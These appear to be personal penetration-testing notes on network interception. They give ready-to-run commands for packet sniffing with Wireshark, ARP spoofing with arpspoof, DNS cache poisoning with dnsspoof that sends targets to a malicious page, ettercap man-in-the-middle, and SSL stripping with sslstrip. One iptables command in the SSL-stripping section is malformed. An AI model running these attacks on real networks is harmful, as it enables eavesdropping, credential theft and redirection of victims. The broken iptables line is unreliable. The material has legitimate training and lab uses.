============================== Packet sniffing tool WireShark ======================================

Packet sniffing tool WireShark (GUI interface tool)
On GUI Menu Bar:
-capture->interfaces->eth0 checked->start
-turn off promiscuous mode to avoid monitoring all traffic unless in public network sniffing


command to run program:
wireshark


filtering queries on the search bar for the program:
-ftp
-ip.dst
-ip.src
-ftp && ip.dst == [IPAdress]
-ip.dst == [IPAdress] || ip.src == [IPAdress]


To see the entire conversation sniffed:
-right-click and click "follow TCP stream"


=============================== Packet sniffing tool WireShark  ========================

=============================== Address Resolution Protocol (ARP) and ARP Spoofing ========================

Address Resolution Protocol (ARP)
-Translates IP address to MAC address of network adapter
-Tells hosts where to send traffic

ARP Spoofing:
-If we can trick hosts into sending traffic to the wrong place we can capture traffic in wireshark
-3 devices on the network, 1. Pen testing device running arpspoof, 2. Secondary device running arpspoof, 3. target device

Program to use for ARP Spoofing:
-arpspoof

command to run program:
arpspoof

Ensure traffic is forwarded to correct destination or it will cause a denial of service:
cat /proc/sys/net/ipv4/ip_forward		----> check if value is 0
echo 1 >  /proc/sys/net/ipv4/ip_forward	----> set it to 1 to keep the traffic moving preventing denial of service

Example use case:
ifconfig
arpspoof -i eth0 -t [TargetIPAdress] [SpoofedIPAdressOfOtherDevice]	---> '-t' refers to the target


=============================== Address Resolution Protocol (ARP) and ARP Spoofing  ========================


=============================== Domain Name Services (DNS)  & DNS Cache Poisoning ========================

-IP addresses are hard to remember:
www.gmail.com is easier to remember than 17.18.19.20
-DNS translates www.gmail.com to its IP address
-Tells the host where to send traffic when called by domain name
-DNS server gives us the IP Address of URL so we can go to the site

DNS Cache Poisoning:
-hosts.txt = "[IPAdress] [URL]"
-Restart arpspoofing program between gateway and target
-3 devices on the network, 1. Pen testing device running arpspoof, 2. Secondary device running arpspoof, 3. target device
-dnsspoof -i eth0 -f hosts.txt
-if target goes to website link while spoofed, they will be redircted to a malicious webpage


=============================== Domain Name Services (DNS)  & DNS Cache Poisoning   ========================


=============================== Breaking SSL Connections with ettercap   ========================


command to run program:
ettercap


Ensure traffic is forwarded to correct destination or it will cause a denial of service:
cat /proc/sys/net/ipv4/ip_forward		----> check if value is 0
echo 1 >  /proc/sys/net/ipv4/ip_forward	----> set it to 1 to keep the traffic moving preventing denial of service


Example use case:
ettercap -Ti eth0 -M arp:remote /[Victim1IPAdress]/ /[Victim2IPAdress]/	---->'-Ti' is text based interface, insert ourselves into broken SSL connection


=============================== Breaking SSL Connections with ettercap   ========================


=============================== SSL Stripping  ========================

-The target will issue a http request to a webpage, then kali  will recieve the webpage and strip off the ssl 
and send the response in http back to the target.
-This works because the target wasnt redirected to the https link, kali was, and it redirected to the http link.


Ensure traffic is forwarded to correct destination or it will cause a denial of service:
cat /proc/sys/net/ipv4/ip_forward		----> check if value is 0
echo 1 >  /proc/sys/net/ipv4/ip_forward	----> set it to 1 to keep the traffic moving preventing denial of service

tools used:
arpspoof - this is required since sslstrip doesnt do its own arp spoofing like ettercap
sslstrip - redirect target from https to http

Example use case:
arpspoof -i eth0 -t [TargetIPAdress] [SpoofedIPAdressOfOtherDevice]
iptables -t PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080	--->setting up iptables
sslstrip -l 8080

=============================== SSL Stripping   ========================